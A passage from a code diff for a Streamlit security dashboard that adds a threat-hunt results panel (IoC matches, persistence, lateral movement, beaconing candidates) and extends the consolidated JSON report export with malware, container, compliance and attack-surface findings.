+            h3.metric("Beaconing Candidates", len(hunt_result.beaconing_candidates))
+
+            if hunt_result.ioc_matches:
+                st.markdown("**IoC Matches:**")
+                ioc_df = pd.DataFrame([
+                    {"Type": m.ioc_type, "Value": m.ioc_value, "Family": m.threat_family,
+                     "Confidence": m.confidence, "Matched In": m.matched_in}
+                    for m in hunt_result.ioc_matches
+                ])
+                st.dataframe(ioc_df, use_container_width=True)
+
+            if hunt_result.persistence_indicators:
+                st.markdown("**🔴 Persistence Indicators:**")
+                for ind in hunt_result.persistence_indicators:
+                    st.markdown(f"- {ind}")
+
+            if hunt_result.lateral_movement_indicators:
+                st.markdown("**🟠 Lateral Movement Indicators:**")
+                for ind in hunt_result.lateral_movement_indicators:
+                    st.markdown(f"- {ind}")
+
+            if hunt_result.beaconing_candidates:
+                st.markdown("**🟡 Beaconing Candidates (regular-interval C2-like traffic):**")
+                beacon_df = pd.DataFrame(hunt_result.beaconing_candidates)
+                st.dataframe(beacon_df, use_container_width=True)
+
+            if not (hunt_result.ioc_matches or hunt_result.persistence_indicators
+                   or hunt_result.lateral_movement_indicators or hunt_result.beaconing_candidates):
+                st.success("No indicators of compromise found in current telemetry.")
+
+
 with tab_report:
     st.markdown("### 📄 Export Consolidated Report")
     report_name = st.text_input("Report name", value=f"sentinel_report_{datetime.now().strftime('%Y%m%d_%H%M')}")
@@ -5311,6 +7311,16 @@ with tab_report:
     report_dict["summary"]["total_secret_findings"] = len(secret_findings)
     if st.session_state.sbom_report:
         report_dict["sbom"] = st.session_state.sbom_report.to_dict()
+    if malware_findings:
+        report_dict["malware_findings"] = [f.to_dict() for f in malware_findings]
+    if container_findings:
+        report_dict["container_findings"] = [f.to_dict() for f in container_findings]
+    if st.session_state.compliance_reports:
+        report_dict["compliance_reports"] = [r.to_dict() for r in st.session_state.compliance_reports]
+    if st.session_state.posture_history_scores:
+        report_dict["posture_score"] = st.session_state.posture_history_scores[-1].to_dict()
+    if entry_points:
+        report_dict["attack_surface"] = [e.to_dict() for e in entry_points]
     json_report = json.dumps(report_dict, indent=2)
 
     st.download_button(
